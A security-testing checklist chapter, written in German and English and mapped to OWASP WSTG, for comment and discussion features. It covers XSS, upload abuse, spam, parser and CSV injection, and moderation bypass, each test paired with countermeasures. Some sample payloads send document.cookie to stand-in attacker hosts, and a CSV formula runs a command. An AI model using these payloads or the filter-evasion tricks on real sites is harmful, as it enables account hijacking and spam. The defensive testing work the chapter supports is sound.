# 12. Comments / Discussion threads

# Kapitel: Comments / Discussion threads

**Ziel**

Schutz von Kommentar-/Diskussions-Funktionen vor Stored XSS, Spam/Rate-Abuse, Content-Poisoning (z. B. bösartige Links), Ressourcen-Missbrauch durch große Posts/Attachments sowie Sicherstellung, dass Mention-/Parsing-Funktionen nicht zur Injection genutzt werden.

**Scope / Prüfbereiche**

- Stored/Reflected XSS im Kommentartext, Titles, Signaturen
- Sanitization / HTML-Whitelist / Editor behaviour (WYSIWYG → comment pipeline)
- Attachments: allowed types, scanning, thumbnailing risks
- Rate limiting / anti-spam controls, CAPTCHA, abusive-account detection
- Mentions / auto-linkification / markdown parsing (injection via parser)
- Feeds/exports (RSS/Atom/CSV) leaking content or executing formulas (CSV injection)
- Moderation pipeline (auto flagging, quarantine, manual approval)
- Size limits, pagination, paging abuse

**WSTG-Mapping (relevante Bereiche)**

- *WSTG-XSS* — Stored/Reflected XSS testing.
- *WSTG-INPV* — Input validation, sanitization, parser/markdown attack surface.
- *WSTG-FILE* — Attachment handling & upload tests.
- *WSTG-BUSL / DoS* — Rate limiting & resource exhaustion.
- *WSTG-DATA* — Export/feeds / CSV injection.
- *WSTG-LOG* — Logging/moderation & detection.

---

## Schnellübersicht – Testfälle (TestID)

- **CM-01** — Stored XSS via comment text (e.g. `<script>`, `<img onerror=...>`).
- **CM-02** — Attachment abuse (upload malicious file, large attachments).
- **CM-03** — Rate abuse / automated posting (spam + resource exhaustion).
- **CM-04** — Mention / markdown parser injection (e.g. `@<script>` or link injection).
- **CM-05** — Content poisoning via links (phishing, clickjacking) or CSV export injection.
- **CM-06** — Feed/export leakage (RSS/Atom/CSV) exposing private comments or executing formulas.
- **CM-07** — Bypass moderation (post approved via edge cases, evading filters).

---

## Detaillierte Tests — Schritte, Hints, Erwartetes Ergebnis

### CM-01 — Stored XSS via comment text

**WSTG-Mapping:** WSTG-XSS / Input Validation.

**Kurz-Schritte**

1. Poste als User A folgenden Kommentar: `<img src=x onerror=fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))>` oder `<script>alert(1)</script>`.
2. Als User B (anderer Browser / incognito) öffne den Thread und beobachte DOM/alerts/network calls.
3. Variationen: encoded forms (`&lt;script&gt;`), SVG payloads, JSON/Markdown edge cases, nested tags, event handler in attributes, `javascript:` links.

**Automation-Hint**

- Use headless browser (Puppeteer) to post payloads and detect JS dialogs/network beacons; Burp to inject payloads via API.
    
    **Erwartetes Ergebnis / Beweis**
    
- Keine Script-Ausführung; payloads escaped or stripped on output. Proof: raw saved comment, screenshot of rendered page, network logs showing no exfil.
    
    **Schnelle Gegenmaßnahme**
    
- Server-seitige whitelist-sanitizer (DOMPurify/OWASP sanitizer) + CSP. Sanitize on store **and** on render.

---

### CM-02 — Attachment abuse (malicious files, large files)

**WSTG-Mapping:** WSTG-FILE / File Upload.

**Kurz-Schritte**

1. Versuch Uploads: `script.php.jpg`, `.svg` with `<script>`, very large files, archive containing many files.
2. Nach Upload: request direct URL, inspect headers, try to execute (if webroot). Also check thumbnail generation for crashes.
3. Test upload of many large attachments to simulate quota exhaustion.

**Automation-Hint**

- Burp file upload + payload permutations; scripted parallel uploads.
    
    **Erwartetes Ergebnis / Beweis**
    
- Attachments validated, executables rejected, size limits enforced; thumbnails crash gracefully. Evidence: raw upload responses, headers, logs.
    
    **Schnelle Gegenmaßnahme**
    
- Validate magic bytes + extension mapping, store outside webroot, scan with AV, set size limits and queue thumbnail jobs in sandbox.

---

### CM-03 — Rate abuse / automated posting (spam)

**WSTG-Mapping:** WSTG-BUSL / Brute-Force & Abuse.

**Kurz-Schritte**

1. Automate posting many comments (e.g., 1000 posts/hour) from same account and multiple accounts.
2. Observe rate limits, CAPTCHA triggers, account lockouts, moderation queue behavior.
3. Try distributed posting (multiple IPs) to test anti-abuse heuristics.

**Automation-Hint**

- Use a small bot-script (async requests) or tooling like locust/vegeta; rotate IPs if allowed in lab; monitor 429/blocked responses.
    
    **Erwartetes Ergebnis / Beweis**
    
- Rate limiting or CAPTCHA triggers; throttled responses (429); abuse detection logs. Evidence: request streams, response codes, moderation flags.
    
    **Schnelle Gegenmaßnahme**
    
- Apply per-user/IP rate limits, progressive backoff, CAPTCHA after N posts, reputation scoring, temp bans.

---

### CM-04 — Mention / markdown parser injection

**WSTG-Mapping:** WSTG-INPV / Parser Injection.

**Kurz-Schritte**

1. Post variants like `@<svg onload=alert(1)>` or `@[user](javascript:alert(1))` if markdown linkification allowed.
2. Test edge cases where server parses mentions to HTML (creating `<a href="/u/xxx">`) — inject special chars to influence generated HTML attributes.
3. Test parser libs (commonmark, markdown-it) for known bypasses.

**Automation-Hint**

- Fuzz mention syntax, feed lists of payloads; inspect HTML produced by parser.
    
    **Erwartetes Ergebnis / Beweis**
    
- Mentions safely encoded; links validated (no `javascript:`); parser not tricked. Evidence: raw saved content + rendered DOM.
    
    **Schnelle Gegenmaßnahme**
    
- Sanitize mention content, validate hrefs, whitelist link protocols (`http(s)`) and escape user input when building mention anchors.

---

### CM-05 — Content poisoning via links (phishing) & CSV injection on exports

**WSTG-Mapping:** WSTG-DATA / Information Disclosure & CSV injection.

**Kurz-Schritte**

1. Post links that look benign but redirect to phishing, or use tinyurl, data URIs, or obfuscated Unicode (homograph).
2. Request exports (CSV) of comments and open in Excel — test payloads beginning with `=`, `+`, , `@` (CSV injection).
3. Check whether link previews or metadata leak internal info.

**Automation-Hint**

- Use prepared list of phishing test URLs and CSV injection examples.
    
    **Erwartetes Ergebnis / Beweis**
    
- Links are neutralized (no auto-executing), exports sanitize cells (prefix `'`), previews show safe text. Evidence: exported CSV content + screenshots.
    
    **Schnelle Gegenmaßnahme**
    
- Sanitize exported values (prefix dangerous leading chars), link-review for trusted domains, warn on external redirects, show domain in plain text for user caution.

---

### CM-06 — Feed / export leakage (RSS/Atom/JSON)

**WSTG-Mapping:** WSTG-DATA / Info Leakage.

**Kurz-Schritte**

1. Generate public feed of comments; post private comment and verify it's not included.
2. Check feed entries for embedded HTML or scripts that could be executed by feed readers.
3. Check RSS → HTML transformation for XSS.

**Erwartetes Ergebnis / Beweis**

- Private comments never in public feeds; feed content escaped; no active scripts. Evidence: feed contents, raw responses.
    
    **Schnelle Gegenmaßnahme**
    
- Ensure feed respects privacy ACLs; escape HTML in feed items; prefer plain text for feeds.

---

### CM-07 — Bypass moderation / evasion techniques

**WSTG-Mapping:** WSTG-LOG / Business Logic.

**Kurz-Schritte**

1. Test common evasion techniques: char obfuscation (`s p a m`), Unicode homoglyphs, zero-width spaces, HTML entity encoding to bypass filters.
2. Post content that should be flagged and check whether moderation triggers.
3. Try slight variants to find gaps in classifier.

**Automation-Hint**

- Generate obfuscation variants programmatically and test in batches.
    
    **Erwartetes Ergebnis / Beweis**
    
- Moderation picks variants or flags for manual review; system documents evasion attempts. Evidence: moderation logs, flagged items.
    
    **Schnelle Gegenmaßnahme**
    
- Normalize input (NFKC), collapse whitespace, strip control chars, apply fuzzy matching and ML-based spam detection, rate limits, manual review for borderline.

---

## Tools & Payload-Beispiele

- Tools: Burp Suite, Puppeteer/Selenium, headless browsers for detection, locust/vegeta for rate tests, exiftool for attachment metadata, ClamAV for attachment scanning, regex/fuzzy libs for mention fuzzing.
- XSS payload examples (PoC only in scope):
    - `<img src=x onerror=alert(1)>`
    - `"><svg onload=alert(1)>`
    - `<script>fetch('https://attacker/steal?c='+document.cookie)</script>`
- CSV injection prefixes: `=CMD|'/C calc'!A0`, `=1+1`, `+SUM(1,1)`, `1+1`, `@cmd`
- Obfuscation examples: `s\u200bpam`, `s p a m`, Unicode homoglyphs (ｅ for e).
- Mention edge: `@user<script>alert(1)</script>` or `@[user](javascript:alert(1))`

---

## Logging, Evidence & Reporting Template (Minimalfelder)

For each finding include:

- **TestID** (e.g., CM-01)
- **WSTG-Ref** (e.g., WSTG-XSS, WSTG-FILE)
- **Kurzbeschreibung**
- **Reproduktionsschritte** (raw POST/req, payload)
- **Beweis** (raw saved content, rendered screenshot, network exfil log, export file)
- **Severity (CVSS) + Business Impact**
- **Kurz-Fix** + Detaillierte Remediation
- **Temporary Mitigations** (e.g., disable attachments, hold posts for review)

---

## Schnelle Gegenmaßnahmen (Kurz)

- **Sanitize on server** with whitelist approach for allowed tags (if HTML allowed). Prefer plain text comments or tightly-scoped markdown. Use robust libs (DOMPurify, OWASP Java HTML Sanitizer, Bleach).
- **Rate limit** posting per user/IP + CAPTCHAs and reputation thresholds for new accounts.
- **Attachment controls**: size limits, content-type checks, magic-byte verification, antivirus scanning, store outside webroot.
- **Moderation pipeline**: auto-flag suspicious posts (links, repeated posts, obfuscated spam), quarantine before publishing for new/untrusted users.
- **Normalize input** to detect obfuscation (unicode normalization, remove zero-width chars).
- **Sanitize exports** (CSV cell prefixing), escape in feeds.
- **Use CSP** and output escaping to mitigate impact of any XSS slip-through.
- **Monitoring & rate alarms**: alert on surge of posts, similar content patterns, or many failed moderation checks.

---

## Tiefergehende / Architektur-Empfehlungen

- Default to **plain text** comments; allow rich content only for trusted roles and via an approved editor that sanitizes server-side.
- Implement **reputation system**: require trust/reputation before links/attachments are auto-published.
- Use ML/heuristics + blocklists for spam detection, and ensure manual review for borderline content.
- Provide **moderator tools**: undo, bulk remove, quarantine, revert edits; immutable audit trail of moderator actions.
- CI tests: run sanitizer regression tests with a corpus of known XSS/spam payloads on every release.
- Rate-limit by both client identity and fingerprint (IP, UA, device fingerprint) to avoid simple distributed attacks.